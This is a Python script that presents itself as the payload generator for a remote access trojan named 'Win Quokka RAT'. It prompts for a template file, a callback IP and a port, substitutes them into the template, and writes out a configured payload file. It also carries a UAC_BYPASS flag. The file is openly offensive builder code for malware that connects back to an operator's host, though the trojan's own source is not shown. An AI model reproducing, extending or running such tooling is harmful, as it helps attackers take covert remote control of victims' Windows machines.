import os

DEBUG = False
UAC_BYPASS = True

DEFAULT_SRC_FILE = "gen_src.py"

DEFAULT_HOST_IP = "127.0.0.1"
DEFAULT_HOST_PORT = "9001"

VERSION = "develop 1.0"

script_exec_dir = os.path.dirname(os.path.abspath(__file__))

print("This is Win Quokka RAT's Payload Generator...")
print(f"version : {VERSION}")
print("input ip and port of host...")

## input src_file name
while(True):
    print(f"file required>>{script_exec_dir}\\src_file_name.py")
    src_file = input("input src_file name (default=gen_src.py) :")
    if(src_file==''):
        src_file = DEFAULT_SRC_FILE
        print("default src_file name choosed...")
        break
    else:
        if os.path.isfile(os.path.join(script_exec_dir,src_file)):
            print("파일 확인.")
            break
        else:
            print("파일이 존재하지 않습니다.")
            continue
## input host_ip
while(True):
    host_ip = input("input host_ip (default=127.0.0.1) :")
    if(host_ip==''):
        host_ip=DEFAULT_HOST_IP
        print(f"default host_ip choosed : {DEFAULT_HOST_IP}")
        break
    else:
        print(f"target host's ip : {host_ip}")
        break

## input host_port
while(True):
    host_port = input("input host_port (default=9001) :")
    if(host_port==''):
        host_port=DEFAULT_HOST_PORT
        print(f"default host_port choosed : {DEFAULT_HOST_IP}")
        break
    else:
        print(f"target host's port : {host_port}")
        break


filedir = os.path.dirname(os.path.abspath(__file__))
file_contents=""
print(filedir)
try:
    with open(f'{filedir}/{src_file}', 'r',encoding="utf-8") as f:    
        file_contents = f.read()
except Exception as e:
    print(f"Reading Error : {e}")

#print(file_contents)


file_contents=file_contents.replace("127.0.0.1",host_ip)
file_contents=file_contents.replace("9001",host_port)
                                      

host_ipaddr_dotReplaced = (host_ip).replace(".","-")

dest_file_name = f"gen_payload_{host_ipaddr_dotReplaced}_{host_port}.py"

print(filedir)
with open(f'{filedir}/{dest_file_name}', 'w',encoding="utf-8") as f:
    # 코드 작성
    f.write(f"{file_contents}")

print(f"payload generated... : {dest_file_name}")

os.system("pause")